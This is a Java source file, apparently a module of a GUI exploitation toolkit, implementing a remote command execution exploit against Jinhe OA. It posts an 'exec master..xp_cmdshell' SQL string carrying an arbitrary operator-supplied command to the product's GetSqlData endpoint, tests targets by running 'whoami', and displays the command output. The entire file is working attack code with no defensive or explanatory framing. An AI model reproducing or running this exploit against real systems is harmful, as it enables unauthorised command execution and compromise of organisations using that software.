package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.Base64Utils;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.util.Date;
import java.util.HashMap;
import java.util.List;

public class jinhe_GetSqlData_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url,textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }


    private static String GetSqlData(String url,String cmd){
        String var = "exec master..xp_cmdshell '"+cmd+"'";
        Response var1 = HttpTools.post(url+"/C6/Control/GetSqlData.aspx/.ashx",var,new HashMap<>(),"gbk");
        String var2 = var1.getText();
        if(var1.getCode()==200&& var2.contains("<![CDATA")){
            List<String> var3 = getIndexOf.getHTMLContents(var2,"item");
            StringBuilder var4 = new StringBuilder();
            for (String element : var3) {
                var4.append(element).append("\n");
            }
            String var5 = var4.toString();
            return var5;
        }
        return null;
    }


    private Boolean att(String url,TextArea textArea){
        String cmd = "whoami";
        String flag = GetSqlData(url,cmd);

        if(flag != null){
            Platform.runLater(()-> {
                textArea.appendText("\n [ jinhe_GetSqlData_RCE ]");
                textArea.appendText("\n whoami执行成功: "+flag);
                textArea.appendText("\n CMD处执行命令");
                textArea.appendText("\n ");
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n ");
            });
            return false;
        }
    }
    private Boolean attcmd(String url,String cmd,TextArea textArea,TextArea textArea_cmd){

        String flag = GetSqlData(url,cmd);

        if (flag != null) {
            Platform.runLater(() -> {
                textArea.appendText("\n "+ cmd +" 执行成功！");
                textArea_cmd.appendText("\n"+flag);
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n "+ cmd +" 执行失败！");
            });
            return false;
        }
    }
}
